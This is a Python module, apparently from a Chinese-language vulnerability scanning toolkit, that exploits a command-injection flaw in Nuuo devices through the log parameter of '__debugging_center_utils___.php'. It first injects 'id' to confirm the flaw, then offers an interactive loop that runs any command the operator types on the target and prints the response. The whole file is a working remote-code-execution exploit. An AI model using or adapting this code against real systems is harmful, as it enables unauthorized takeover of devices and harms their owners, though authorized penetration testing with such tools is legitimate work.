#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
import requests
class NUUORceScan:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        if not self.batch:
            OutPrintInfo("Nuuo", "开始检测Nuuo-Rce...")
        url2 = url + '/__debugging_center_utils___.php?log=;id'
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "gid=" in req.text:
                OutPrintInfoSuc("Nuuo", f"存在Nuuo-Rce {url2}")
                if self.batch:
                    OutPutFile("Nuuo",f"存在Nuuo-Rce {url2}")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("Nuuo", "不存在Nuuo-Rce")
            return False
        except Exception:
            if not self.batch:
                OutPrintInfo("Nuuo", "目标请求出错")
            return False
    def send_payload2(self,url,cmd):
        # OutPrintInfo("Nuuo", "开始检测Nuuo任意文件下载")
        url2 = url + f'/__debugging_center_utils___.php?log=;{cmd}'
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            OutPrintInfo("Nuuo", f"响应:\n{req.text.strip()}")

        except Exception:
            OutPrintInfo("Nuuo", "目标请求出错")

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        proxy = target["proxy"]
        header = target["header"]
        self.verify = target["ssl"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)

        if self.send_payload(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否进行RCE利用([b bright_red]y/n[/b bright_red])")
                if choose == "y":
                    while True:
                        cmd = Prompt.ask("[b yellow]输入需要执行对命令")
                        if cmd == "exit":
                            break
                        self.send_payload2(url, cmd)

